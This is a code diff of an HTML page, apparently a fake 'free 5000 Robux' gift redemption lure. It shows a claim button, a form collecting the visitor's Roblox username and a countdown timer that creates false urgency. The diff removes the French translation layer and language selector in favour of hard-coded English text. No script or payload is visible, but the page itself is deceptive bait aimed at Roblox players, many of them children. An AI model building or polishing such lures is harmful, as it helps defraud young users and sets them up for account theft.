@@ -1,12 +1,12 @@
 <!doctype html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Redeem Gift</title>
-  <meta name="description" content="Claim your Robux gift before it expires." data-i18n-meta="description">
-  <meta property="og:title" content="You have received 5000 Robux" data-i18n-meta="ogTitle">
-  <meta property="og:description" content="Claim your Robux gift before it expires." data-i18n-meta="description">
+  <meta name="description" content="Claim your Robux gift before it expires.">
+  <meta property="og:title" content="You have received 5000 Robux">
+  <meta property="og:description" content="Claim your Robux gift before it expires.">
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://example.com/">
   <meta property="og:image" content="images/Gqqe3TPIp7pL.webp">
@@ -18,37 +18,25 @@
 </head>
 <body>
   <main class="redeem-page">
-    <header class="language-bar">
-      <label class="language-label" for="language-select" data-i18n="languageLabel">Langue</label>
-      <select class="language-select" id="language-select" aria-label="Language">
-        <option value="fr">Francais</option>
-        <option value="en">English</option>
-        <option value="es">Espanol</option>
-        <option value="de">Deutsch</option>
-        <option value="pt">Portugues</option>
-        <option value="it">Italiano</option>
-      </select>
-    </header>
-
     <section class="gift-stage">
       <div class="gift-card" aria-live="polite">
-        <h1 data-i18n="title">RECUPERER<br>CADEAU</h1>
+        <h1>REDEEM<br>GIFT</h1>
         <img class="gift-icon" src="images/YzXr5i06sU0P.webp" alt="" width="112" height="112">
         <p class="gift-copy">
-          <span data-i18n="giftPrefix">Vous avez recu</span>
+          <span>You received</span>
           <img src="images/YRv0cUNGIx9q.svg" alt="" width="26" height="26">
           <strong>5000 Robux</strong>
         </p>
-        <button class="claim-button" type="button" id="open-claim" data-i18n="claimButton">RECLAMER</button>
+        <button class="claim-button" type="button" id="open-claim">CLAIM</button>
       </div>
 
       <form class="claim-modal" id="claim-form" hidden>
         <button class="close-button" type="button" id="close-claim" aria-label="Close">x</button>
-        <h2 data-i18n="modalTitle">Confirmer le compte</h2>
-        <p data-i18n="modalCopy">Entre ton pseudo Roblox pour reserver le cadeau.</p>
-        <label for="username" data-i18n="usernameLabel">Pseudo Roblox</label>
-        <input id="username" name="username" type="text" minlength="3" autocomplete="off" placeholder="Ton pseudo" data-i18n-placeholder="usernamePlaceholder" required>
-        <button class="final-button" type="submit" data-i18n="finalButton">Claim reward</button>
+        <h2>Confirm account</h2>
+        <p>Enter your Roblox username to reserve the gift.</p>
+        <label for="username">Roblox username</label>
+        <input id="username" name="username" type="text" minlength="3" autocomplete="off" placeholder="Your username" required>
+        <button class="final-button" type="submit">Claim reward</button>
         <span id="claim-status" class="claim-status"></span>
       </form>
     </section>
@@ -56,19 +44,19 @@
     <section class="countdown" aria-label="Expiration">
       <div>
         <strong id="days">1</strong>
-        <span data-i18n="dayLabel">Day</span>
+        <span>Day</span>
       </div>
       <div>
         <strong id="hours">12</strong>
-        <span data-i18n="hoursLabel">Hours</span>
+        <span>Hours</span>
       </div>
       <div>
         <strong id="minutes">17</strong>
-        <span data-i18n="minutesLabel">Minutes</span>
+        <span>Minutes</span>
       </div>
       <div>
         <strong id="seconds">56</strong>
-        <span data-i18n="secondsLabel">Seconds</span>
+        <span>Seconds</span>
       </div>
     </section>
   </main>
